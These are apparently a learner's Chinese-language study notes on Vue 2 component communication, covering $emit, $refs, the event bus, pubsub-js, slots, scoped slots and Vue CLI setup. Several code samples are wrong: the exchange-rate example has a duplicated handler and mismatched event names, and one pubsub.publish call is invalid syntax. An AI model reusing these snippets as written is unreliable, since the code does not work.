我们在哪里使用$emit发射的事件 就在哪里解绑事件

<br>

**<font color="#C2185B">this.$off('自定义事件名')</font>**  
只能解绑一个事件

<br>

**<font color="#C2185B">this.$off(['自定义事件名1', '自定义事件名2'])</font>**  
只能解绑指定事件

<br>

**<font color="#C2185B">this.$off()</font>**  
只能解绑全部事件

<br>

**注意:**  
我们接收子组件通过自定义事件传递过来的数据的时候 要将数据保存在data中 然后我们才能在模板中使用

<br>

### **应用场景:**
比如 现在一个网页中的分类侧边栏 里面有很多的选项
```
热门推荐
手机数码
电脑办公        内容区
计生情趣
美容护肤
```

像在这个小组件上的数据 其实都是从服务器获取的吧, 也就是说 我们外层最大的组件发送请求 将获取到的数组 传递给这个子组件, 在子组件中展示

但是这时候 因为里面有很多的选项, 比如页面上来的内容 属于 热门推荐里面的 这时我 点击了 手机数码, 应该显示手机数码里的内容了

这时候就要告诉父组件 子组件点击了谁 子组件里有很多的类别 我到底点击了哪一个类别呢?
- 如果我点击了 手机数码的类型, 父组件知道了后应该请求手机数码的数据 
- 如果我点击了 家电家器的类型, 父组件根据家电家器的类型请求对应数据

所以子组件里发生了事件, 我们告诉父组件发生了什么样的事件, 并且要告诉父组件 现在发生的事件 点击的数据是谁 得给父组件传递过去

因为给父组件传递过去, 父组件就能拿到一个变量 category = 'phone', 然后根据phone把phone发送到服务器去请求新一轮的数据

<br>

### **1. 子组件内定义数据**
```js 
data() {
  return {
    // 定义要展示在页面中的数据
    categaries: [
      // 到时候我们把id传递到服务器 一般不需要传递名字的
      {id: 'aaa', name: '热门推荐'},
      {id: 'bbb', name: '手机数码'},
      {id: 'ccc', name: '电脑办公'},
      {id: 'ddd', name: '家用加点'},
    ]}}
```

### **2. 在子组件的模板里进行展示**
```html
<template id='cpn'>
  <div>
    <!-- 展示数据 -->
    <button v-for='item of categaries'>{{item.name}}</button>
  </div>
</template>
```

### **3. 点击 手机数据 请求对应对应数据**
通过:自定义事件
```
$emit('发射的事件名', 参数)
```

我需要告诉父组件点了谁 父组件 再根据我点击了谁请求对应的数据  
那我就要监听按钮的点击 并且把item传递进子组件中的方法里 这样才能拿到item的id

既然在子组件的模板里 绑定了 点击事件, 那就在子组件内 methods属性中, 做事件的处理函数 我们给按钮绑定了点击事件后 点击按钮, 因为把item传递到子组件里方法里, 所以子组件的内部就知道了 点击了谁

但是不够, 应该是父组件知道了点击了谁 根据点击了谁去请求新的数据这时候我们就要把点击了谁告诉父组件了 怎么传? 通过自定义事件

```html
<div>
  <button v-for='item of categaries' @click='itemClick(item)'>{{item.name}}</button>
</div>
```

```js 
methods: {
  // 参数, 发射事件的名称, 把item作为参数传递过去
  itemClick(item) {
    this.$emit('itemclick', item)
  }}}
```

我们把 itemclick 事件发送出去了, 父组件就要监听这个事件(子组件发射事件, 父组件接收事件) 父组件怎么接收 监听这个事件?

<br>

### **要点:**
$emit() 发送的事件名 最好都是小写 或者可以加 - 分割 item-click, 在html部分里 不要使用驼峰标识符 html不认识


### **5. 父组件接收(绑定)子组件发射出来的事件**
```html
<div id="app">
  <cpn v-on:itemclick='cpnClick'></cpn>
</div>
```

既然在被管理区域内绑定了cpnClick事件 那么就在父组件的methods属性里进行处理  
cpnClick 在默认事件中 没有传递参数 会默认的把event对象传递过来  
但是在自定义事件中, 因为这个自定义事件 不是浏览器的事件对象 所以默认会传item

<br>

```html
<cpn v-on:itemclick='cpnClick'></cpn>
```

```js 
const app = new Vue({
  el:'#app',
  data: {
    message: ' 一切都会好的',
  },
  components: {
    cpn
  },
  methods: {
    cpnClick(item) {
      console.log(item)
    }}})
```

### **总结:**
上面介绍了两种方式 子组件和父组件之间的通信 相同点: 父组件中都要配置回调用户接收数据

<br><br>

# 案例: 汇率转换? 父子组件通信
### 要点: 
- 子组件中使用父组件的变量数据
- 在子组件的模板中添加input标签 双向绑定子组件中的数据, 达到修改input的值可以影响到子组件中data中的变量, *同时还会修改父组件中的变量*
- 在输入框1中输入数字 输入框2中的数字是输入框1中的100倍, 输入框2中数字是输入框中的1/100

<br>

- 在父组件中的data属性中, 创建子组件需要使用的变量, 并注册子组件
- 在子组件中的props属性里创建变量, 用于接收父组件传递过来的数据
- 在子组件的模板中使用props属性里创建变量
- 在被管理区域内调用``<cpn />`` 并在内部使用v-bind:子组件变量名='父组件data中的数据'
- 基本结构已经搭建好了 接下来实现需求, 在子组件的模板中创建input标签, 双向绑定子组件中的cnum1, cnum2对应的数据

<br>

### 注意: 
props属性中的变量 用在展示的话没问题, 但是用来修改的话请创建data() {}  
复习知识, 如果是子组件创建变量 数据等 要通过data() {}的方式 作用域的关系  
在data函数中创建新的变量 让props的属性中的变量 赋值给data中创建的新的变量

```
为了解决上面的需求, 我使用了v-model 双向绑定了 子组件中props里对应的变量值
可以实现修改文本框的值从而影响到, 子组件中props里对应的变量值

但是报错了 错误提示:
如果动态修改子组件props中的变量的话, 请一定通过父组件来修改
因为子组件中props属性是用来接收父组件中的数据的 用来展示可以 但是要是修改的话不行

因为props最终的目的是让父组件给它传数据, props中变量的数据修改的话应该是来自父组件, 父组件传递过来什么值, props中的变量就是什么值

如果修改子组件props中的属性的话, 书写起来会很乱, 而且两个地方(input的双向绑定 和 父组件的修改)同时这么做的话 这个数值有可能是会乱套的
```

```html
<template id='cpn'>
  <div>
    <h3>{{cnum1}}</h3>
    <input type="text" v-model='cnum1'>

    <h3>{{cnum2}}</h3>
    <input type="text" v-model='cnum2'>
  </div>
</template>
```

**在子组件中创建data函数, 用来创建新的变量来接收props属性中变量的值**
```js 
  const cpn = {
    template: '#cpn',
    props: {
      cnum1: Number,
      cnum2: Number
    },
    data() {
      return {
        dnum1: this.cnum1,
        dnum2: this.cnum2
      }
    }
  }
```

**不使用v-model的形式, 我们使用 :value='data函数中的新变量' + @input的方式**  
:value='data函数中的新变量' 的方式 能实现单向操作 修改父组件的变量num1的值 会影响到 界面上的数据
num1 = cnum1 = dnum1 界面上显示的是dnum1

<br>

**通过input的事件, 监听input的情况 实时赋值给 子组件data函数的变量**  
到这里就实现了v-model的功能, 修改文本框内的数据会影响到子组件data函数中的自定义变量dnum, 但是还没有实现, 影响到子组件props属性中用于接收父组件数据的变量
```js 
<input type="text" :value='dnum1' @input='num1Input'>
<input type="text" :value='dnum2' @input='num2Input'>

// 因为没有传递实参 所以默认是传递了event事件对象 应用event.target相当于this

const cpn = {
  template: '#cpn',
  props: {
    cnum1: Number,
    cnum2: Number
  },
  data() {
    return {
      dnum1: this.cnum1,
      dnum2: this.cnum2
    }
  },
  methods: {
    num1Input(event) {
      this.dnum1 = event.target.value
    },
    num2Input(event) {
      this.dnum2 = event.target.value
    }
  }
}
```

**我们要把从文本框获取的数据, 传回到父组件中 所以应用到了 $emit() 发射事件**  
我们需要把从文本框里获取到的文本实时发射出去, 让父组件来监听获取参数  
父组件需要在被管理区域的cpn标签内部绑定自定义事件 来监听获取子组件传递过来的参数  
我们还要父组件中定义处理方法 把获取到的参数赋值给data中的变量  

但是默认情况下 input里面的值都是string类型 所以会报类型的错误 我们可以做下类型的转换

```js 
<div id="app">
  <cpn :cnum1='num1' :cnum2='num2' @num1inputchange='num1inputchange' @num2inputchange='num2inputchange'></cpn>
</div>

const cpn = {
  template: '#cpn',
  props: {
    cnum1: Number,
    cnum2: Number
  },
  data() {
    return {
      dnum1: this.cnum1,
      dnum2: this.cnum2
    }
  },
  methods: {
    num1Input(event) {
      this.dnum1 = event.target.value;
      // 实时把从文本框里获取到的文本发射出去, 让父组件来监听获取参数
      this.$emit('num1inputchange', this.dnum1);
    },
    num2Input(event) {
      this.dnum2 = event.target.value;
      this.$emit('num2inputchange', this.dnum2);
    }
  }
}

const app = new Vue({
  el:'#app',
  data: {
    num1: 3,
    num2: 1
  },

  components: {
    cpn
  },

  methods: {
    num1change(value) {
      this.num1 = Number(value);
    },
    num1change(value) {

      // 但是默认情况下 input里面的值都是string类型 所以会报类型的错误 我们可以做下类型的转换
      this.num2 = Number(value);
    }
  }
})
```

**以上就实现了 修改文本框的值 会同时修改子组件中的data函数中的变量 dnum1 -- 然后又通过$emit()发射出去了事件和dnum1的参数, 父组件来创建事件来处理接收子组件发射出来的自定义函数** 

然后子组件拿到了dnum1这个数据, 赋值给父组件中data中的变量num1


**在文本框1中输入的数值, 在文本框2中呈现的是文本框1的100倍**  
**在文本框2中输入的数值, 在文本框1中呈现的是文本框2的1/100**   
要实现上面的两点, 还是要在子组件的methods方法中继续写逻辑
```js 
const cpn = {
  template: '#cpn',
  props: {
    cnum1: Number,
    cnum2: Number
  },
  data() {
    return {
      dnum1: this.cnum1,
      dnum2: this.cnum2
    }
  },
  methods: {
    num1Input(event) {
      this.dnum1 = event.target.value;
      // 实时把从文本框里获取到的文本发射出去, 让父组件来监听获取参数
      this.$emit('num1inputchange', this.dnum1);

      // 我们把修改过后的数据再次发射出去, 再让父组件来接收, 再重新传递回来
      this.dnum2 = this.dnum1 * 100;
      this.$emit('num1inputchange', this.dnum2);
    },
    num2Input(event) {
      this.dnum2 = event.target.value;
      this.$emit('num2inputchange', this.dnum2);

      // 这个逻辑里dnum2也发生了变化, 我们也给它发射出去 让父组件知道
      this.dnum1 = this.dnum2 / 100;
      this.$emit('num1inputchange', this.dnum1);
    }
  }
}
```

<br><br>

# 父 访问 子 $children  $refs
前面我们了解了父子组件中如果传递数据, 但有些情况是 在父组件里面能拿到子组件的对象然后直接操作子组件里面的一些东西(就不是两者之间传递东西了)

比如我拿到子组件实例后直接调用子组件对象中的方法 或者说子组件里面去拿父组件里面的对象调下父组件里面的方法或属性 通过对象直接访问的

<br>

**<font color="#C2185B">父组件访问子组件: 使用 $children 或 $refs</font>**  
**<font color="#C2185B">子组件访问父组件: 使用 $parent</font>**  
```
这么记好不好 访问谁 $后面跟着就是谁 访问父 $parent 访问子 $children
```

<br>

### **$children的访问:**
this.$children是一个*数组类型*, 它包含所有子组件对象(页面中的所有子组件)

<br>

### **$children的缺陷:**
通过$children访问子组件时, 是一个数组类型, 访问其中的子组件必须通过索引值
但是当子组件过多, 我们需要拿到其中一个时, 往往不能确定它的索引值, 甚至还可能发生变化 有时候, 我们想明确获取其中一个特定的组件, 这个时候就可以使用 *$refs*

也就是说 父 访问 子 使用 *$refs*

<br>

### **$children的使用方法**
**访问方法:**
```js
this.$children[0].showMessage()
```

**访问属性:**
```js
this.$children[0].num
```

<br>

### **案例:**
当页面中只有一个组件时, 使用 $children 访问父组件中的方法和属性

需求: 点击按钮后 使用子组件中的方法输出语句

当我点击按钮的时候 就打印子组件里面的内容 由于下面这里是被管理区域 我们在这里监听的事件的处理函数应该在vue实例也就是父组件里面  

在父组件的methods中的处理函数中 也就是在vue实例也就是父组件中访问子组件里的内容
我们可以通过第一种方式 $children 的方式访问子组件 它是一个数组 所有的子组件都装在这个数组里面

**弊端:**  
页面中不仅是一个子组件可能有很多 不能确定索引 索引还会变
```js 
<div id="app">
  <cpn></cpn>
  <button @click='btnClick'>点击</button>
</div>

const app = new Vue({
  el:'#app',
  data: {
    message: '一定会好的'
  },

  components: {
    cpn
  },

  methods: {
    btnClick() {
      /*
        console.log(this.$children)   //[VueComponent]
        既然有这个对象 那我们就可以这样
        this.$children[0].showMessage();
        我们还可以通过$children访问子组件中的属性
      */
      let result = this.$children[0].num;
      console.log(result)
    }
  }
})
```

<br>

### **$refs的使用: this.$refs.refname.属性名**
$refs 和 ref 指令通常是一起使用的  
首先 我们通过ref给某一个子组件绑定一个特定的id
其次, 通过this.$refs.refname就可以访问到该组件了

<br>

### **使用ref 和 $refs.id.属性名的方式 访问子组件中的属性 或 方法**
$refs默认是一个空的对象($refs是一个对象类型)
```js 
<div id="app">
  // 在组件上添加 ref属性
  <cpn ref='aaa'></cpn>
  <button @click='btnClick'>点击</button>
</div>

  methods: {
    btnClick() {
      // 默认的$refs是一个空的对象, 它必须和ref配合使用 使用ref在组件上添加类似id的值
      console.log(this.$refs.aaa.num)
    }
  }
})
```

### **总结**
获取所有子组件的时候使用 $children
获取某一个组件的时候使用 ref 和 $refs

<br><br>

### **子访问父 $parent**
但是我们在实际开发中并不太会使用 $parent 获取数据后使用
``` 
因为我们组件型的开发核心是复用性, 也就是说我们开发的一个一个组件可以自由的在任何文件页面内使用, 所以要保持它的独立性, 如果我们使用了$parent的话 组件和组件之间就会相互关联, 不方便复用, 耦合性太高 
```

```html
<div id="app">
  <cpn></cpn>
</div>

  <template id='cpn'>
  <div>
    <h3>我是子组件</h3>

    // 子组件中的按钮对应的处理函数应该在子组件的methods内
    <button @click='btnClick'>点击</button>
  </div>
</template>

<script>
const cpn = {
  template: '#cpn',
  methods: {
    btnClick() {

      // 在这里我们要访问父组件 通过$parent Vue 因为这个子组件的父组件就是vue实例 如果是父组件(不是根组件)的话会是VueComponent
      console.log(this.$parent)
      console.log(this.$parent.message)
    }
  }
}
</script>
```

<br><br>

### **访问根组件(Vue实例) $root**
$root可以访问到Vue实例中的属性和方法
```js
this.$root.message
```

一般Vue实例里面什么也没有 只有一些重要的东西, 这个属性用的也很少
```js 
const cpn = {
  template: '#cpn',
  methods: {
    btnClick() {
      console.log(this.$root.message)
    }
  }
}

const app = new Vue({
  el:'#app',
  data: {
    message: '一定会好的'
  },
  components: {
    cpn
  }
})
```

<br><br>

# 全局事件总线
用于任意组件之间的通信

App内部组件们 实现嵌套关系的时候 A组件想收到别人发给它的数据
```
  App
  ---------------
  |             |
  |  A          |
  |     B       |
  |       C     |
  |             |
  ---------------     
                            --------
                            |   X   |
                            --------
```

**原理:**  
当两个组件之间想要进行数据的交换的时候 
```
A组件:  接收数据
C组件:  传递数据
```

发送数据方:  
C组件使用 某种方式 将自定义事件 和 数据 发送到 事件总线X中  
比如我们之前学到的 this.$emit('aaa', this.data)


接收数据放:   
A组件使用 某种方式 绑定事件总线中某个自定义事件(C组件发射的自定义事件)
比如我们之前学到的 ``<Student @demo='handleData'>``

注意: 我们上面是比如哦

<br>

**X 应该拥有的特性:** 
1. 它要保证所有的组件都要看到它
2. 它还需要能用调用 $on / $off / $emit

<br>

**<font color="#C2185B">创建 X(事件总线) 让所有组件都能看到</font>**  
在 main.js 文件中 创建 事件总线  

**要点:**   
因为要让所有的组件都能够看到 所以 我们将事件总线添加到 Vue的原型对象上

<br>

**<font color="#C2185B">方式1: 在 BeforeCreate 的时候在Vue的原型对象上添加 this</font>**  
在 beforeCreate() 生命周期函数中 定义事件总线

**理由:**  
因为这个生命周期中 模板还没有解析 数据 和 结构还没挂载到页面上 我们提前准备好 事件总线
```js 
new Vue({
  name: 'App',
  components: {
    MyItem
  },

  beforeCreate() {
    Vue.prototype.$bus = this
  }
})
```

<br>

**<font color="#C2185B">方式2: Vue.prototype.$bus = new Vue()</font>**  
我们在Vue实例的外侧 在Vue的原型对象上添加事件总线 让它等于 new Vue()
```js 
Vue.prototype.$bus = new Vue()

new Vue({
  el:'#app',
  render: h => h(App)
})
```

<br>

**<font color="#C2185B">数据发送方: this.$bus.$emit('自定义事件', data)</font>**  
数据发送方在对应的处理函数中 在事件总线中创建一个自定义事件 并可以把数据携带过去
```js 
<button @click='sendData'>把name属性交给App组件</button>

methods: {
  sendData() {
    this.$bus.$emit('sendName', this.name)    // 这里还可以直接把sendData发送过去 看自己的
  }
}
```

**<font color="#C2185B">数据接收方: this.$bus.$on('自定义事件', (data) => { })</font>**  
数据接收方在 mounted() 生命周期函数中 找到$bus 并绑定总线中 数据发送方发送的事件

**注意:**  
周期函数中的回调要写成箭头函数 或者 回调定义在组件的methods中
```js 
mounted() {
  this.$bus.$on('sendName', (data) => {
    this.name = data
    console.log('App组件收到了', data)
  })
}
```

<br>

**注意:解绑事件总线中的方法**  
我们是通过this.$bus.$on的方式 监听事件总线上的事件 用于得到其它组件想要发送的数据
但是我们要在 this.$bus.$on 的组件上(数据接收方的组件) 在该组件即将要销毁的时候 beforeDestroy() 解绑事件

```js 
beforeDestroy() {
  this.$bus.$off('sendName')
}
```

<br>

### **总结:**
父子之间传递数据 还是props方法比较方便

<br><br>

# 消息的订阅与发布
适用于任意组件之间的通信

**数据的接收方:**   
订阅消息 + 指定回调 :  如果有人发布了该消息 回调就会被调用

**数据的发送方:**  
发布消息 发布接收方订阅的消息 + 携带数据 :  这边部分消息由于接收方订阅了该消息 指定回调中就能接收到数据

**注意:**  
1. 需要数据的人订阅消息 提供数据的人发布消息
2. 订阅 和 发布 的消息名必须一致

<br>

### **pubsub.js**
我们使用这个库来完成 消息的订阅与发布技术 这个库在任何的框架里面都是实现
```js 
publish:    发布
subscribe:  订阅
```

**安装:**
```
npm i pubsub-js
```

在数据接收方 和 数据发送方 中引入 pubsub 引入后它是一个对象 身上有很多的方法

<br>

**数据接收方:**  
引入 pubsub & 订阅消息  
订阅消息方法是写在 mounted() 中的
```
pubsub.subscribe('消息名', (消息名, data) => { })
```

<br>

**数据发送方:**  
引入 pubsub & 发布消息
```js
pubsub.publish('消息名', data)
```

```js 
// 数据接收方: 订阅消息
import pubsub from 'pubsub-js'

mounted() {
  // 我记得可以用占位符将第一个形参占住 因为它没用
  this.pubId = pubsub.subscribe('message', (_, data) => {

  })
}


// 数据接收方: 订阅消息
import pubsub from 'pubsub-js'

methods: {
  pubsub.publish('message', data)
}
```

<br>

**取消订阅:**
```js
pubsub.unsubscribe(this.pubId)
```

当数据接收方(订阅消息的组件)要销毁的时候 我们还是要取消订阅  
取消订阅的方式类似定时器 通过接收订阅消息时的id来取消 订阅 类型const timer = xxx
```js 
beforeDestroy() {
  pubsub.unsubscribe(this.pubId)
}
```

**注意:**  
订阅消息的回调要写箭头函数 在vue里面 事件总线 和 消息的订阅与发布 的模型一样 所以在vue里面使用的并不是很多

<br><br>

# 默认插槽
我们要展现几个列表 那我是不是可以将下面的列表定义成组件 ``<Category>``
一个组件内部应该显示的信息: 
```js 
美食         汽车
1. xxx      1. xxx
2. xxx      2. xxx
3. xxx      3. xxx
```

创建好展示组件后 我们在父组件里面使用 使用的同时 将父组件中的数据传递给 ``<Category>`` 组件 让它进行展示

我们将对应的 数组 和 标题 使用props的形式传递过去
```js 
// 父组件
data: {
  foods: ['锅巴', '烧烤', '龙虾']
  games: ['红警', '吃鸡', '拳皇']
  films: ['教父', '赛车', '你好']
}

<Category title='美食' :listData='foods'>
<Category title='游戏' :listData='games'>
<Category title='电影' :listData='films'>

// 这里我们可以直接传递一样的 属性名listData 给子组件 不需要这样 :foods='foods' 
```

那 ``<Category>`` 组件需要接收
```js 
// 子组件
props: ['listDate', 'title']

// 是用数据 遍历
{{title}} 
li v-for='item in listData'
```

但是现在有一个问题 我们定义了一个组件 ``<Category>`` 然后通过父组件传递的不同的数据 展示不不同的样式 但组件里面都是通过遍历数据展示的结果  

假如有一天 其中的一个组件内部不展示列表了 开始展示图片 剩下的组件展示列表 那怎么办？ 

组件内部没办法处理了 列表要是删了 需要展示列表的组件不能起作用了 要是换成图片那该组件都会展示图片了

```
也可以利用条件渲染 但是这么做的话 子组件里面就要定义好不同的数据结构
比如 v-show=='美食' 怎么怎么样 但是不清晰 不方便
```

这时候我们需要使用插槽 *当子组件要展示不同的结构的时候 我们可以使用插槽*

<br>

### **为什么使用插槽?**
在生活中很多地方都有插槽, 电脑的usb插槽, 插板当中的电源插槽 插槽的目的是让我们原来的设备具备更多的扩展性  
比如电脑的usb我们可以插入u盘, 硬盘, 手机, 音响, 键盘, 鼠标等

<br>

### **组件的插槽**
组件的插槽也是为了让我们封装的组件更加具有扩展性 让使用者可以决定组件内部的一些内容到底展示什么 不是在组件里面写死, 而是由外界决定的

<br>

### **什么又是具有扩展性**
现在的这个组件不具备任何扩展性, 现在就是一个标题和p标签, 假如页面上有三个组件  
第一个组件我想要一个button  
第二个组件我想要一个span  
第三个组件我想要一个i  

```js 
<template id='cpn'>
  <div>
    <h3>我是组件</h3>
    <p>
      我是组件,哈哈哈
    </p>
  </div>
</template>
```

怎么办?
现在就一个h3 p写死的, 没办法根据自己的要求私人订制, 没有任何的扩展性  
解决办法其实非常简单 我们直接在组件内容定义一个插槽就可以了  

*插槽就相当于一个预留的空间*, 就跟电脑上的usb一样 外设任意, 你想显示什么东西你决定, 在真是开发里面也一样, 很多组件都要封装一个插槽 

<br>

### **如何封装插槽合适呢?**
抽取共性, 保留不同  

最好的封装方式就是将共性抽取到组件中, 将不同暴露为插槽 一旦我们预留了插槽, 就可以让使用者根据自己的需求, 决定插槽中插入什么内容 是搜索框, 还是文字, 还是菜单, 由调用者自己来决定

<br>

### **插槽的基本使用:**
调用组件的人 将要展示的内容 放在组件 标签体 位置
```html
<component>
  调用者要在组件中展示的内容
</component>
```

``<component>``组件内部 使用 ``<slot>`` 标签告诉展示内容放在那里

<br>

### **示例:**
组件内部使用 ``<slot>`` 挖一个坑 等着组件的使用者进行填充
```html
<!-- 1. 父组件 -->
<cpn> 
  <!-- 不同内容 -->
  <button>案例</button>
</cpn>

<cpn>
  <!-- 不同内容 -->
  <span>我是span</span>
</cpn>


<!-- 子组件 -->
<div>
  <h3>我是子组件</h3>

  <!-- 组件的使用者想展示的内容将会在这里出现 -->
  <slot></slot>
</div>
```

<br>

### **``<slot>默认值</slot>``**
当调用组件的人 没有传入要在插槽中展示什么的时候 将展示默认值

**注意:插槽的内容是父组件中定义的结构 样式问题**
父组件中定义结构 这个结构的样式 是在父组件中写 还是在子组件中写？

**在父组件中!!!**  
因为vue会将父组件中的内容解析好后 放入到子组件里 所以我们要将放入插槽里面的内容的样式在父组件中整理好

<br>

### 具名插槽(具有名字的插槽)
我们可以想一下假如我们组件中的插槽过多的时候 我们就需要给每一个插槽起一个名字 这样填入的内容就能找到对应的位置

<br>

**<font color="#C2185B">1. 子组件中 给插槽添加名字 ``<slot name='demo'>``</font>**  
给组件内部的插槽起名字 便于内容对准位置

<br>

**<font color="#C2185B">2. 父组件中 通过 ``<template v-slot:插槽名>`` 指定数据插入的位置</font>**  
```html
<component> 
  <!-- 因为使用template包裹元素不会产生额外的结构 -->
  <template v-slot:slotName>
    要插入的数据
  </template>


  <!-- 简写:  -->
  <template #slotName>
    要插入的数据
  </template>
</component>
```

<br>

### **要点:**
插槽``<slot>``最终会被替换掉, 所以尽量不要在插槽上设置v-if v-bind v-else等属性   
如果要设置的话 我们都要给``<slot>``包裹一层``<div>``把上述类似的属性放在这层``<div>``里

也就是说插槽``<slot name=''>``里尽量只有name属性, 其它属性来一层包裹``<div>``

```js 
// 错的方式
<slot v-if='isActive' name='icon-img'></slot>     

// 对的方式
<div v-if='isActive'>
  <slot name='icon-img'><slot>                   
</div>
```

<br><br>

# 扩展: 编译作用域
我在vue实例中和组件中分别定义 isShow变量, 利用 v-show 来看下当在被管理区域内使用 v-show 的时候查找的是组件的变量还是实例中的变量

```html
<div id="app">
  <!-- 会显示(因为现在在实例的作用域内) -->
  <cpn v-show='isShow'></cpn>
</div>

<!-- 子组件 -->
<template id='cpn'>
  <div>
    <h3>我是子组件</h3>
    <!-- 不会显示(组件的作用域) -->
    <button v-show='isShow'>clickme</button>
  </div>
</template>

<script>
const cpn = {
  template: '#cpn',
  data() {
    return {
      isShow:false
    }
  }
}

const app = new Vue({
  el:'#app',
  data: {
    message: '一定会好的',
    isShow:true
  },
  components: {
    cpn
  }
})
</script>
```

<br>

### ** 编译作用域**
在查找变量的时候 都是看变量是在哪个模板里面的 在vue实例的中 就会使用vue实例中的变量

父组件模板的所有变量都会在父级作用域内编译
子组件模板的所有变量都会在子级作用域内编译

我们只需要观察这个变量是在哪个组件里面出现的, 变量就使用该组件内的变量

<br><br>

# 作用域插槽
上面我们了解了作用域 也就是a组件自己的变量只能a组件自己使用 b组件是使用不了的 

一般来讲  
带有插槽的组件都是负责格式 父组件主要负责传递数据 这样同样的格式能生成不同的数据

<br>

**但是注意:**  
作用域插槽是数据在子组件中 需要子组件向父组件传递数据 父组件决定以什么形式来渲染数据
```
        ↗   →   ↘
子组件(数据)    父组件
```


现在需求变了 我希望的是同样的数据 展示不同的格式
```js 
// 父组件
<Son>
  以ul的形式在插槽中展示数据
</Son>

<Son>
  以ol的形式在插槽中展示数据
</Son>

<Son>
  以h4的形式在插槽中展示数据
</Son>



// 子组件
<slot>我是一些默认值<slot>
```

这时候我们就不能将定义格式的工作放在子组件里面了 因为放在子组件里面格式都是一样的

我们将数据放在子组件里面 让格式化的工作交给调用插槽的人  
但是又有新的问题 由于作用域的关系 父组件不能使用子组件的数据那怎么办？

<br>

### 作用域插槽的使用方式:
**首先:**  
**<font color="#C2185B">&lt;slot :数据='data中的数据'&gt;</font>**  
子组件 在 ``<slot>`` 中通过 props 传递数据给 父组件

插槽给我们提供了便捷的方式 将子组件中的数据传递给调用插槽的人 就如同传递props一样 将数据传递给其它组件 将数据传递给了插槽的使用者

```js 
// 子组件
<slot :games='games'>
```

<br>

**然后:**  
**<font color="#C2185B">&lt;template scope='变量'&gt;</font>**  
父组件使用 ``<template scope='变量'>`` 的形式接收数据


**注意:**  
该变量是一个对象 我们传递过来的数据 是对象中的一个属性 既然这么就可以利用解构赋值哦
```html
<!-- 子组件 -->
<slot :list="list">默认插槽文字</slot>

<!-- 父组件 -->
<Child>
  <template slot-scope="list">
    <div>
      {{list}}
    </div>
  </template>
</Child>

<!-- 
  list输出结果: { "list": [ "aa", "bb", "cc" ] }
 -->
```

:list="list" 也就是说, 将list封装到一个对象的属性中 xxx:{list:数据}   
slot-scope="data" 相当于我们定义了一个 data对象 接收 子组件传递过来的对象 子组件相当于默认暴露了一个对象 父组件自己定义变量进行接收

<br>

**2.5以下的版本这么使用:**
```js 
<Son>
  <template scope="data">
    {{data.msg}}
  </template>
</Son>
```

**2.5以上的版本这么使用**
```js
// 父组件
<Child>
  <template slot-scope="data">
    {{data.msg}}
  </template>
</Child>

// 子组件
<div>
  <slot :msg="msg">我是Top默认插槽</slot>
</div>
```

亲测以上两种在 v2.6 都好用

<br>

### **具名插槽 和 作用域插槽 不能一起使用么？**
可以但是 父组件要使用这种方式确定指定插槽和绑定数据 

**<font color="#C2185B">&lt;template v-slot:子组件的插槽名="子组件中传递过来的变量对象"&gt;</font>**  

```html 
<!-- 子组件 -->
<div class="center">
  <slot name="center" :age="age"></slot>
</div>


<!-- 父组件 -->
<Child>
  <template v-slot:center="data">
    <span>{{data.age}}</span>
  </template>
</Child>
```

<br><br>

# Vue-Cli 脚手架的介绍和安装
如果只是简单写几个vue的demo程序, 那么不需要vue cli, 如果是在开发大型项目, 那么你需要并且必然需要使用vue cli

使用Vue.js开发大型应用时, 我们需要考虑代码目录结构, 项目结构和部署, 热加载, 代码单元测试等事情

如果每个项目都要手动完成这些工作, 那么无疑效率比较低效, 所以通常我们会使用一些脚手架工具来帮助完成这些事情

<br>

### **Cli是什么意思**
command line interface, 翻译为命令行界面, 但是俗称脚手架(在命令行输出几个简单的命令就会生成想要的结构)

vue cli是一个官方发布vue.js项目脚手架, 使用vue-cli可以快速搭建vue开发环境以及对应的webpack配置

脚手架最重要的就是生成webpack配置

<br>

### **Vue cli的使用前提 是安装nodejs**
node环境要求在8.9以上

<br>

### **Vue cli也要求安装webpack**
因为脚手架会帮我们生成webpack配置

<br>

### Vue Cli的使用
现在仅在学习阶段了解到了 cli有2 3两个版本, 但在cli3上用cli2的方式初始化项目是不行的, 在学习的过程中 我们装了3并且也下载了旧版本的2

安装vue脚手架 一般不需要本地安装 全局就可以了
cli.vuejs.org

<br>

### **全局安装脚手架**
```
npm install -g @vue/cli
vue --version
```
安装成功后可以有 vue 命令 可以在终端查看是否安装成功 比如 

```js 
npm install -g @vue/cli@3.2.1

// 如果安装出错 我们在后面加上 --force
npm install -g @vue/cli@3.2.1 --force

// 上面安装的是cli3 我们再3的基础上也是可以使用脚手架2的, 在3的基础上拉一个模板就可以使用脚手架2了
```

<br>

### **cli2 3 都能使用的安装方式**
```
npm install -g @vue/cli-init

上面安装的是cli3, 如果需要想按照cli2的方式初始化项目是不可以的 我们要拉取 2.x 模板(旧版本) 运行下面命令拉取旧版本 这样操作后 后面就可以既用cli2 也有cli3
```

<br>

### **通过脚手架创建项目的命令**
切换我们要创建vue项目的目录后再使用命令创建项目
在创建项目的时候尽可能的回避掉主流库的名字

<br>

### **cli4 创建项目的指令**
```
npx vue create 项目名
```

<br>

### **cli3 创建项目的指令**
```
vue create 项目名
```

<br>

### **cli2 创建项目的指令**
```
vue init webpack 项目名
```

<br>

### **启动项目**
```
npm run serve
```

### **扩展**
淘宝镜像 输入一行命令就可以
```
npm config set registry https://registry.npm.taobao.org
```

```
"lint": "vue-cli-service lint"
该命令是把我们写过的所有代码进行检查 一般不这么干
```

<br><br>

# Vue Cli2 初始化项目的过程
在根目录下使用命令  
```
vue init webpack vuecli2learning  创建项目
```

```
Project name (vuecli2learning) 

Project description (A Vue.js project)
描述信息 : 默认是括号里面的

Author (slnn2080 <xl63864807@163.com>)
默认作者: 它会自动读取git上配置的东西

Vue build (Use arrow keys)
```

<br>

### **Runtime + Compiler: recommended for most users**
```
Runtime-only: about 6KB lighter min+gzip, but templates (or any Vue-specific HTML) are ONLY 
allowed in .vue files - render functions are required elsewhere
```

之后构建项目的时候 用哪一个来进行构建是用Runtime + Compiler? Runtime-only?  
可以用上下方向键来选择 项目开发中更多的是使用 runtime-only

使用runtime的优势 会比上面的小6kb 这个的运行效率更高 我们先暂时选择上面的

<br>

```
Install vue-router? (Y/n) 
```

是否要安装路由大型项目的时候都会使用vue全家桶(vuecore+vue-router+vuex)  
我们暂时不安装, 为了方便学习


```
Use ESLint to lint your code? (Y/n) 
```

是否使用eslint 如果上面选择的是y会让你选择一种规范

<br>

### **Standard (https://github.com/standard/standard) 标准规范**
```
Airbnb (https://github.com/airbnb/javascript)       
none (configure it yourself)
```

```
Set up unit tests (Y/n)     
```
单元测试 这里需要依赖一些第三方的框架

```
